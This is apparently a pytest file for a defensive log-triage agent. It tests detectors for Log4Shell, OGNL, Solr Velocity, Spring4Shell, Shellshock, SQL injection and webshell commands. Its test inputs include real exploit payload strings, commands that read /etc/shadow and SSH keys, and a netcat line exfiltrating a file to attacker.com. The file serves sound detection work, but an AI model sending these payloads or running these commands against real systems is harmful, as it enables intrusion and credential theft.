"""Tests de las heuristicas de triaje del observador.

Valida que los patrones de CVE modernos (Log4Shell, Struts OGNL, Confluence OGNL,
Solr Velocity, Spring4Shell) se detecten correctamente sin falsos positivos
en trafico benigno.
"""


from src.agents.observer.nodes import (
    _LOG4SHELL_RE,
    _OGNL_CONFLUENCE_RE,
    _OGNL_RE,
    _SHELLSHOCK_RE,
    _SOLR_VELOCITY_RE,
    _SPRING4SHELL_RE,
    _build_ip_profiles,
    classify_webshell_cmd,
    extract_webshell_cmd,
)


def _apache(ip: str, method: str, path: str, status: int, ua: str = "curl/8.19.0") -> dict:
    """Helper: log entry en formato Apache combined."""
    return {
        "labels": {"container_name": "target"},
        "message": (
            f'{ip} - - [26/Apr/2026:02:46:24 +0000] '
            f'"{method} {path} HTTP/1.1" {status} 1234 "-" "{ua}"'
        ),
    }


class TestLog4ShellDetection:
    def test_basic_jndi_ldap(self):
        assert _LOG4SHELL_RE.search("${jndi:ldap://attacker.com/exploit}")

    def test_jndi_rmi(self):
        assert _LOG4SHELL_RE.search("${jndi:rmi://evil/payload}")

    def test_jndi_dns(self):
        assert _LOG4SHELL_RE.search("${jndi:dns://oob.example.com}")

    def test_obfuscated_lower(self):
        """Variante con ${lower:j}${lower:n}... que evade filtros simples."""
        payload = "${lower:j}ndi:ldap://x/y"
        assert _LOG4SHELL_RE.search(payload)

    def test_in_user_agent(self):
        ua = "Mozilla/5.0 ${jndi:ldap://attacker/a}"
        assert _LOG4SHELL_RE.search(ua)

    def test_no_false_positive_on_normal_traffic(self):
        normal = "GET /api/user?id=123 HTTP/1.1"
        assert not _LOG4SHELL_RE.search(normal)

    def test_no_false_positive_on_template_literal(self):
        """`${variable}` en codigo legitimo NO es log4shell."""
        assert not _LOG4SHELL_RE.search("${user.name}")
        assert not _LOG4SHELL_RE.search("Hello ${name}")


class TestOGNLDetection:
    def test_struts2_runtime_exec(self):
        """CVE-2017-5638 payload en Content-Type."""
        payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('id'))}"
        assert _OGNL_RE.search(payload)

    def test_struts2_process_builder(self):
        payload = "%{(#a=new ProcessBuilder('id').start()).(#a.getInputStream())}"
        assert _OGNL_RE.search(payload)

    def test_confluence_ognl(self):
        """CVE-2022-26134 payload en URI."""
        payload = "/${@java.lang.Runtime@getRuntime().exec('id')}/"
        assert _OGNL_CONFLUENCE_RE.search(payload)

    def test_no_false_positive_curly_braces(self):
        """JSON payloads con {} NO son OGNL."""
        assert not _OGNL_RE.search('{"id": 123}')
        assert not _OGNL_CONFLUENCE_RE.search('{"name": "test"}')


class TestSolrVelocity:
    def test_resource_loader_enabled(self):
        """CVE-2019-17558: payload estandar."""
        payload = "params.resource.loader.enabled=true"
        assert _SOLR_VELOCITY_RE.search(payload)

    def test_velocity_response_writer(self):
        payload = "wt=velocity&v.template=custom&VelocityResponseWriter"
        assert _SOLR_VELOCITY_RE.search(payload)


class TestSpring4Shell:
    def test_class_module_classloader(self):
        """CVE-2022-22965."""
        payload = "class.module.classLoader.resources.context.parent.pipeline"
        assert _SPRING4SHELL_RE.search(payload)

    def test_class_get_resource(self):
        assert _SPRING4SHELL_RE.search("class.getResource('/evil')")


class TestShellshock:
    def test_basic_payload(self):
        assert _SHELLSHOCK_RE.search("() { :; };")

    def test_alt_variant(self):
        assert _SHELLSHOCK_RE.search("() { _; };")


class TestExtractWebshellCmd:
    def test_unencoded(self):
        url = "http://target/shell.php?cmd=id"
        assert extract_webshell_cmd(url) == "id"

    def test_url_encoded(self):
        """Bug del audit: cmd%3D no extraia."""
        url = "http://target/shell.php?cmd%3Did"
        assert extract_webshell_cmd(url) == "id"

    def test_url_encoded_value(self):
        url = "http://target/shell.php?cmd=cat%20%2Fetc%2Fpasswd"
        assert extract_webshell_cmd(url) == "cat /etc/passwd"

    def test_no_cmd_param(self):
        assert extract_webshell_cmd("http://target/index.php") is None


class TestClassifyWebshellCmd:
    def test_privilege_escalation(self):
        cmd = "python3 -c 'import os; os.setuid(0); os.system(\"cat /root/flag\")'"
        tactic, tid = classify_webshell_cmd(cmd)
        assert tactic == "Privilege Escalation"
        assert tid == "TA0004"

    def test_credential_access_shadow(self):
        tactic, tid = classify_webshell_cmd("cat /etc/shadow")
        assert tactic == "Credential Access"
        assert tid == "TA0006"

    def test_credential_access_ssh_key(self):
        tactic, _ = classify_webshell_cmd("cat /home/user/.ssh/id_rsa")
        assert tactic == "Credential Access"

    def test_discovery_uname(self):
        tactic, tid = classify_webshell_cmd("uname -a")
        assert tactic == "Discovery"
        assert tid == "TA0007"

    def test_discovery_id(self):
        tactic, _ = classify_webshell_cmd("id")
        assert tactic == "Discovery"

    def test_default_execution(self):
        """Comando raro que no matchea ningun patron → Execution."""
        tactic, tid = classify_webshell_cmd("unknown_random_tool --flag value")
        assert tactic == "Execution"
        assert tid == "TA0002"

    def test_exfiltration_nc(self):
        tactic, _ = classify_webshell_cmd("nc attacker.com 4444 < secret.txt")
        assert tactic == "Exfiltration"


class TestLoginSuccessGeneralized:
    """Detect login_success en DVWA, WordPress, paneles admin genericos."""

    def test_dvwa_login_post_302_marks_success(self):
        logs = [_apache("10.10.0.5", "POST", "/login.php", 302)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1

    def test_wordpress_login_post_302_marks_success(self):
        logs = [_apache("10.10.0.5", "POST", "/wp-login.php", 302)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1

    def test_dvwa_login_post_200_marks_failed(self):
        logs = [_apache("10.10.0.5", "POST", "/login.php", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_failed"] == 1
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 0

    def test_signin_path_post_302(self):
        logs = [_apache("10.10.0.5", "POST", "/signin", 302)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["login_success"] == 1

    def test_get_login_does_not_mark_login(self):
        logs = [_apache("10.10.0.5", "GET", "/login.php", 302)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["login_success"] == 0
        assert prof["login_failed"] == 0


class TestWebshellExecGeneralized:
    """Detect execution via cmd= URL (clasica) y POST a endpoints exec (DVWA)."""

    def test_dvwa_exec_post_200_marks_execution(self):
        logs = [_apache("10.10.0.5", "POST", "/vulnerabilities/exec/", 200)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["webshell_execution"] == 1
        assert "Execution" in prof["webshell_sub_tactics"]

    def test_classic_cmd_url_get_200_marks_execution(self):
        logs = [_apache("10.10.0.5", "GET", "/shell.php?cmd=id", 200)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["webshell_execution"] == 1
        assert "Discovery" in prof["webshell_sub_tactics"]

    def test_dvwa_exec_get_404_does_not_mark(self):
        logs = [_apache("10.10.0.5", "GET", "/vulnerabilities/exec/", 404)]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["10.10.0.5"]
        assert prof["webshell_execution"] == 0

    def test_dvwa_upload_post_200_marks_execution(self):
        logs = [_apache("10.10.0.5", "POST", "/vulnerabilities/upload/", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 1

    def test_post_to_random_endpoint_does_not_mark(self):
        logs = [_apache("10.10.0.5", "POST", "/api/users", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["webshell_execution"] == 0


class TestUrlEncodedCveDetection:
    """Los exploits comunmente envian payloads URL-encoded que solo matchean
    tras unquote (). _build_ip_profiles ahora decodifica URL antes del match."""

    def test_log4shell_url_encoded_in_url(self):
        """${jndi:ldap://x} encoded como %24%7bjndi%3aldap%3a%2f%2fx%7d."""
        encoded = "/api?q=%24%7bjndi%3aldap%3a%2f%2fevil%2fx%7d"
        logs = [_apache("10.10.0.5", "GET", encoded, 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["log4shell_attempts"] >= 1

    def test_log4shell_plaintext_in_user_agent(self):
        """JNDI en User-Agent suele venir plaintext — debe seguir matcheando."""
        logs = [_apache("10.10.0.5", "GET", "/", 200, ua="${jndi:ldap://evil/a}")]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["log4shell_attempts"] >= 1

    def test_solr_velocity_endpoint_match(self):
        """Endpoint tipico /solr/<core>/select?wt=velocity es signal."""
        logs = [_apache("10.10.0.5", "GET", "/solr/admin/select?q=1&wt=velocity", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["solr_velocity_attempts"] >= 1

    def test_sqli_url_encoded_quote(self):
        """' OR 1=1-- como %27%20OR%201%3d1%2d%2d debe detectarse."""
        encoded_url = "/page?id=%27%20OR%201%3d1%2d%2d"
        logs = [_apache("10.10.0.5", "GET", encoded_url, 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1

    def test_sqli_union_with_inline_comment(self):
        """sqlmap envia UNION/**/SELECT — antes pasaba unmatched."""
        logs = [_apache("10.10.0.5", "GET", "/page?id=1+UNION/**/SELECT+1,2,3", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1

    def test_sqli_blind_sleep_function(self):
        """Boolean blind con SLEEP() para detectar timing-based SQLi."""
        logs = [_apache("10.10.0.5", "GET", "/page?id=1';SLEEP(5)--", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1

    def test_sqli_information_schema(self):
        logs = [_apache("10.10.0.5", "GET", "/p?id=1+UNION+SELECT+table_name+FROM+information_schema.tables", 200)]
        p = _build_ip_profiles(logs)
        assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1


def _solr_log(path: str, params: str, status: int) -> dict:
    """Helper: log entry en formato Solr 8.x Java logging."""
    msg = (
        f'2026-05-04 22:54:32.585 INFO  (qtp1346799731-91) '
        f'[   x:demo] o.a.s.c.S.Request [demo]  webapp=/solr '
        f'path={path} params={{{params}}} status={status} QTime=2'
    )
    return {"labels": {"container_name": "log4shell"}, "message": msg}


class TestSolrJavaLogParsing:
    """Apache Solr 8.x usa Java logging style (NO Apache combined).
    El observer debe parsear este formato y aplicar heuristicas
    CVE-specific aun sin IP del cliente."""

    def test_solr_normal_query_no_signals(self):
        logs = [_solr_log("/select", "q=*:*&wt=json", 0)]
        p = _build_ip_profiles(logs)
        ip = "solr-internal"
        assert ip in p["ip_profiles"]
        prof = p["ip_profiles"][ip]
        assert prof["total"] == 1
        assert prof["log4shell_attempts"] == 0
        assert prof["solr_velocity_attempts"] == 0

    def test_solr_log4shell_jndi_in_params(self):
        """JNDI payload en params de Solr query."""
        logs = [_solr_log(
            "/select",
            "q=${jndi:ldap://attacker/x}&wt=json",
            400,
        )]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["solr-internal"]
        assert prof["log4shell_attempts"] >= 1

    def test_solr_velocity_exploit(self):
        """CVE-2019-17558: wt=velocity con template custom."""
        logs = [_solr_log(
            "/demo/select",
            "q=1&wt=velocity&v.template=custom",
            200,
        )]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["solr-internal"]
        assert prof["solr_velocity_attempts"] >= 1

    def test_solr_velocity_url_encoded_template(self):
        """Velocity con template URL-encoded como en exploit publico."""
        logs = [_solr_log(
            "/demo/select",
            "q=1&wt=velocity&v.template=%23set($x=$rt.exec(%27id%27))",
            200,
        )]
        p = _build_ip_profiles(logs)
        prof = p["ip_profiles"]["solr-internal"]
        assert prof["solr_velocity_attempts"] >= 1

    def test_solr_log_does_not_match_apache_regex(self):
        """Confirma que el log Solr NO matchea Apache regex (regression check)."""
        from src.agents.observer.nodes import _TRIAGE_LOG_RE
        msg = '2026-05-04 22:54:32.585 INFO  (qtp1346799731-91) [   x:demo] o.a.s.c.S.Request [demo]  webapp=/solr path=/select params={q=*} status=0 QTime=2'
        assert _TRIAGE_LOG_RE.match(msg) is None

    def test_solr_log_matches_solr_regex(self):
        """Confirma que _SOLR_LOG_RE matchea formato Java Solr."""
        from src.agents.observer.nodes import _SOLR_LOG_RE
        msg = '2026-05-04 22:54:32.585 INFO  (qtp1346799731-91) [   x:demo] o.a.s.c.S.Request [demo]  webapp=/solr path=/select params={q=*} status=0 QTime=2'
        m = _SOLR_LOG_RE.match(msg)
        assert m is not None
        assert m.group(3) == "/select"  # path
        assert m.group(5) == "0"  # status
